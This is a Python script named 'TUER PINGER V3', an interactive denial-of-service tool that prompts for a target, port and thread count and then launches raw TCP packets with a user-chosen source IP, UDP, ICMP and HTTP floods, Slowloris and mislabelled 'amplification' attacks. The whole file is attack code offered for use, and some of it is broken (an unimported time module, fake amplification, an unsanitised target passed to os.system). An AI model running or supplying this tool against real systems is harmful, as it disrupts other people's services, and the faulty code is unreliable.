import socket
import threading
import requests
import os
import struct

def checksum(data):
    s = 0
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + (data[i + 1])
        s = s + w
    s = (s >> 16) + (s & 0xFFFF)
    s = s + (s >> 16)
    s = ~s & 0xFFFF
    return s

def create_tcp_packet(source_ip, dest_ip, source_port, dest_port, flag):
    # TCP Header fields
    seq = 0
    ack_seq = 0
    doff = 5    # 4-bit field, size of tcp header, 5 * 4 = 20 bytes
    window = socket.htons(5840)  # maximum allowed window size
    check = 0
    urg_ptr = 0

    offset_res = (doff << 4) + 0
    tcp_flags = 0

    if flag == 'SYN':
        tcp_flags = 0x02
    elif flag == 'ACK':
        tcp_flags = 0x10
    elif flag == 'FIN':
        tcp_flags = 0x01
    elif flag == 'RST':
        tcp_flags = 0x04

    tcp_header = struct.pack('!HHLLBBHHH', source_port, dest_port, seq, ack_seq, offset_res, tcp_flags, window, check, urg_ptr)

    # Pseudo Header fields
    source_address = socket.inet_aton(source_ip)
    dest_address = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)

    psh = struct.pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length)
    psh = psh + tcp_header

    tcp_checksum = checksum(psh)
    tcp_header = struct.pack('!HHLLBBH', source_port, dest_port, seq, ack_seq, offset_res, tcp_flags, window) + struct.pack('H', tcp_checksum) + struct.pack('!H', urg_ptr)
    return tcp_header

def tcp_attack(target, port, source_ip, flags):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        dest_ip = socket.gethostbyname(target)
        source_port = 1234  # Arbitrary source port

        tcp_header = create_tcp_packet(source_ip, dest_ip, source_port, port, flags)

        
        ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 20 + len(tcp_header), 54321, 0, 255, socket.IPPROTO_TCP, 0, socket.inet_aton(source_ip), socket.inet_aton(dest_ip))

        packet = ip_header + tcp_header

        s.sendto(packet, (target, port))
        s.close()
        print(f"TCP Attack on {target}:{port} with flag {flags} succeeded.")
    except Exception as e:
        print(f"TCP Attack on {target}:{port} with flag {flags} failed: {e}")

def udp_attack(target, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(b'PING\n', (target, port))
        s.close()
        print(f"UDP Attack on {target}:{port} succeeded.")
    except Exception as e:
        print(f"UDP Attack on {target}:{port} failed: {e}")

def https_attack(target, path="/", proxy=None):
    try:
        url = f"https://{target}{path}"
        proxies = {"https": proxy} if proxy else None
        response = requests.get(url, proxies=proxies)
        print(f"HTTPS Attack on {url} responded with status code {response.status_code}.")
    except Exception as e:
        print(f"HTTPS Attack on {target} failed: {e}")

def tcp_amp_attack(target, port, amplifier):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((amplifier, port))
        s.sendall(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
        s.close()
        print(f"TCP-AMP Attack using {amplifier}:{port} against {target} succeeded.")
    except Exception as e:
        print(f"TCP-AMP Attack using {amplifier}:{port} against {target} failed: {e}")

def udp_amp_attack(target, port, amplifier):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode(), (amplifier, port))
        s.close()
        print(f"UDP-AMP Attack using {amplifier}:{port} against {target} succeeded.")
    except Exception as e:
        print(f"UDP-AMP Attack using {amplifier}:{port} against {target} failed: {e}")

def icmp_flood(target):
    try:
        for _ in range(1000):
            os.system(f"ping -c 1 {target}")
        print(f"ICMP Flood on {target} succeeded.")
    except Exception as e:
        print(f"ICMP Flood on {target} failed: {e}")

def slowloris(target, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target, port))
        sock.send(b"GET / HTTP/1.1\r\n")
        while True:
            sock.send(b"X-a: b\r\n")
            time.sleep(10)
    except Exception as e:
        print(f"Slowloris attack on {target}:{port} failed: {e}")

def http_flood(target, path="/", proxy=None):
    try:
        url = f"http://{target}{path}"
        proxies = {"http": proxy} if proxy else None
        while True:
            response = requests.get(url, proxies=proxies)
            print(f"HTTP Flood attack on {url} responded with status code {response.status_code}.")
    except Exception as e:
        print(f"HTTP Flood attack on {url} failed: {e}")

def start_attack(attack_type, target, port, num_threads, source_ip, flags=None, amplifier=None, path="/", proxy=None):
    for _ in range(num_threads):
        if attack_type == "TCP":
            thread = threading.Thread(target=tcp_attack, args=(target, port, source_ip, flags))
        elif attack_type == "UDP":
            thread = threading.Thread(target=udp_attack, args=(target, port))
        elif attack_type == "HTTPS":
            thread = threading.Thread(target=https_attack, args=(target, path, proxy))
        elif attack_type == "TCP-AMP":
            thread = threading.Thread(target=tcp_amp_attack, args=(target, port, amplifier))
        elif attack_type == "UDP-AMP":
            thread = threading.Thread(target=udp_amp_attack, args=(target, port, amplifier))
        elif attack_type == "ICMP":
            thread = threading.Thread(target=icmp_flood, args=(target,))
        elif attack_type == "Slowloris":
            thread = threading.Thread(target=slowloris, args=(target, port))
        elif attack_type == "HTTP":
            thread = threading.Thread(target=http_flood, args=(target, path, proxy))
        thread.start()

if __name__ == "__main__":
    print("""
    TUER PINGER V3!
    
    ============
    by Plxanonymous0 and godlybacon
    
    ============
    
    - PROXY SERVER SUPPORT
    - ADDED TCP FLAGS!
    - NEEDS PHONE TO BE ROOTED!
    """)
    print("Available attack types: TCP, UDP, HTTPS, TCP-AMP, UDP-AMP, ICMP, Slowloris, HTTP")
    attack_type = input("Enter the attack type: ")
    target = input("Enter the target website or IP: ")
    port = int(input("Enter the port (e.g., 80 for HTTP, 443 for HTTPS): "))
    num_threads = int(input("Enter the number of threads: "))
    source_ip = input("Enter your source IP: ")
    flags = None
    amplifier = None
    path = "/"
    proxy = None

    if attack_type == "TCP":
        flags = input("Enter the TCP flag (SYN, ACK, FIN, RST): ")
    if attack_type in ["TCP-AMP", "UDP-AMP"]:
        amplifier = input("Enter the amplifier IP: ")
    if attack_type in ["HTTPS", "HTTP"]:
        path = input("Enter the path (default '/'): ") or "/"
        proxy = input("Enter the proxy (e.g., http://proxy-server:port) (leave blank for none): ")

    start_attack(attack_type, target, port, num_threads, source_ip, flags, amplifier, path, proxy)